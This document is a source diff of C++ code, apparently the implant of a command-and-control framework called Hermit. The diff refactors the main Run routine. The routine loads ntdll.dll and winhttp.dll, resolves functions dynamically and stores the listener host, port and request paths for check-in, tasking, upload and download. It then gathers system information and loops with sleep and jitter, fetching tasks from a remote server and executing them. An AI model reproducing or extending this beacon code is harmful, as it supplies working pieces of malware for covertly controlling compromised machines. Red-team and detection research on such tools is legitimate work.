@@ -2,7 +2,7 @@
 
 namespace Hermit
 {
-	BOOL Run(
+	VOID Run(
 		HINSTANCE       hInstance,
 		INT 			nCmdShow,
 		LPCWSTR			lpPayloadType,
@@ -19,35 +19,56 @@ namespace Hermit
 		INT				nJitter,
 		INT				nKillDate
 	) {
-		State::StateManager sm;
-		sm.SetHInstance(hInstance);
-		sm.SetCmdShow(nCmdShow);
-		sm.SetPayloadType(lpPayloadType);
-		sm.SetListenerProtocol(lpProtocol);
-		sm.SetListenerHost(lpHost);
-		sm.SetListenerPort(nPort);
-		sm.SetReqPathCheckIn(lpReqPathCheckIn);
-		sm.SetReqPathDownload(lpReqPathDownload);
-		sm.SetReqPathTaskGet(lpReqPathTaskGet);
-		sm.SetReqPathTaskResult(lpReqPathTaskResult);
-		sm.SetReqPathUpload(lpReqPathUpload);
-		sm.SetReqPathWebSocket(lpReqPathWebSocket);
-		sm.SetSleep(nSleep);
-		sm.SetJitter(nJitter);
-		sm.SetKillDate(nKillDate);
-		sm.SetHSession(NULL);
-		sm.SetHConnect(NULL);
-		sm.SetHRequest(NULL);
-		sm.SetQuit(FALSE);
 
-		// Get initial system info for sending it when check-in
-		std::wstring infoJson = Handler::GetInitialInfo(sm);
+		HMODULE hNTDLL = LoadLibrary(L"ntdll.dll");
+        if (!hNTDLL)
+        {
+			return;
+        }
 
-		Handler::InitHTTP(sm);
-		if (sm.GetHSession() == NULL || sm.GetHConnect() == NULL)
+        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
+        if (!hWinHTTPDLL)
+        {
+			FreeLibrary(hNTDLL);
+            return;
+        }
+
+		State::PState pState = new State::State;
+
+		pState->pTeb 				= NtCurrentTeb();
+		pState->hNTDLL				= hNTDLL;
+		pState->hWinHTTPDLL			= hWinHTTPDLL;
+		pState->pProcs 				= Procs::FindProcs(hNTDLL, hWinHTTPDLL);
+		pState->hInstance 			= hInstance;
+		pState->nCmdShow 			= nCmdShow;
+		pState->lpPayloadType 		= lpPayloadType;
+		pState->lpListenerProto 	= lpProtocol;
+		pState->lpListenerHost 		= lpHost;
+		pState->nListenerPort 		= nPort;
+		pState->lpReqPathCheckIn 	= lpReqPathCheckIn;
+		pState->lpReqPathTaskGet 	= lpReqPathTaskGet;
+		pState->lpReqPathTaskResult = lpReqPathTaskResult;
+		pState->lpReqPathDownload 	= lpReqPathDownload;
+		pState->lpReqPathUpload 	= lpReqPathUpload;
+		pState->lpReqPathWebSocket 	= lpReqPathWebSocket;
+		pState->nSleep 				= nSleep;
+		pState->nJitter 			= nJitter;
+		pState->nKillDate 			= nKillDate;
+		pState->wUUID 				= L"";
+		pState->wTask 				= L"";
+		pState->wTaskResult 		= L"";
+		pState->hSession 			= NULL;
+		pState->hConnect 			= NULL;
+		pState->hRequest 			= NULL;
+		pState->pSocket 			= NULL;
+		pState->bQuit 				= FALSE;
+
+		std::wstring wInfoJson = Handler::GetInitialInfoJSON(pState);
+
+		Handler::HTTPInit(pState);
+		if (pState->hSession == NULL || pState->hConnect == NULL)
 		{
-			Handler::CloseHTTP(sm);
-			return FALSE;
+			goto exit;
 		}
 
 		// WinHttpSetStatusCallback(hSession, WinHttpCallback, WINHTTP_CALLBACK_FLAG_SECURE_FAILURE, 0);
@@ -55,27 +76,30 @@ namespace Hermit
 		// Check in
 		do
 		{
-			Sleep(sm.GetSleep() * 1000);
+			Sleep(pState->nSleep * 1000);
 
-			if (Handler::CheckIn(sm, infoJson))
+			if (Handler::CheckIn(pState, wInfoJson))
 				break;
 		} while (1 == 1);
 
 		// Get/Execute/Send tasks
 		do
 		{
-			Sleep(sm.GetSleep() * 1000);
+			Sleep(pState->nSleep * 1000);
 
-			if (!Handler::GetTask(sm))
-				continue;
+			// Check if it reached the KillDate
+			// if (reachedKillDate(pState))
+			// 	break;
 
-			Handler::ExecuteTask(sm);
-			Handler::SendTaskResult(sm);
-		} while (!sm.GetQuit());
+			Handler::Task(pState);
 
-		Handler::CloseHTTP(sm);
-		
-		return TRUE;
+			// Manage socket connections
+			// Handler::Socket(pState);
+		} while (!pState->bQuit);
+
+	exit:
+		State::Free(pState);
+		return;
 	}
 }
 
